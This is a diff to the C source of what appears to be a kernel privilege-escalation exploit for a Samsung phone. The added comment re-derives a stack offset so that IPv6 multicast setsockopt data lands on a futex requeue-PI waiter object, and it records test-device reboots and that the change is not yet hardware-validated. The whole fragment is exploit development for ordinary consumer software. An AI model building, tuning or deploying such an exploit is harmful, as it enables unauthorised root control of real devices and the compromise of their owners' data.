@@ -22,7 +22,25 @@
 #define SLIDE_MCAST_DOMAIN AF_INET6
 #define SLIDE_MCAST_LEVEL IPPROTO_IPV6
 #define SLIDE_MCAST_OPTION MCAST_JOIN_SOURCE_GROUP
-#define MCAST_WAITER_OFF 0x28
+/*
+ * MCAST_WAITER_OFF re-derived from the M356B vmlinux.elf (recovered from the
+ * official FUS Image + BTF). do_ipv6_setsockopt copies the MCAST_JOIN_SOURCE_GROUP
+ * optval (0x108 bytes) into sp+0x40 of its own 0x2c0 frame. The futex waiter
+ * lives at sp+0x98 of futex_wait_requeue_pi's 0x1b0 frame.
+ *   futex chain (E-relative): do_el0_svc 0x10 + el0_svc_common 0x30 +
+ *     invoke_syscall 0x20 + __arm64_sys_futex 0x70 + do_futex 0x130 +
+ *     futex_wait_requeue_pi 0x1b0 => waiter at E - 0x318 + 0x98 = E - 0x280.
+ *   mcast chain (E-relative): do_el0_svc 0x10 + el0_svc_common 0x30 +
+ *     invoke_syscall 0x20 + __arm64_sys_setsockopt 0x10 + sock_common_setsockopt
+ *     0x10 + ipv6_setsockopt 0x40 + do_ipv6_setsockopt 0x2c0 => optval at
+ *     E - 0x340 + 0x40 = E - 0x300.
+ *   -> MCAST_WAITER_OFF = (E - 0x280) - (E - 0x300) = 0x80.
+ * The previous 0x28 was an under-counted frame sum; 0x28+0x58 fits the 0x108
+ * stamp but does not land on the waiter, and the 4/4 writer-enter reboots are
+ * consistent with a wrong waiter offset rather than the ~50% MCAST write race.
+ * Still not hardware-validated.
+ */
+#define MCAST_WAITER_OFF 0x80
 #define APP_CLOSED_FOPS_ROUTE 1
 #define APP_FOPS_BEFORE_PIPE 1
 #define APP_EXACT_PIPE_BUFFER_ONLY 1
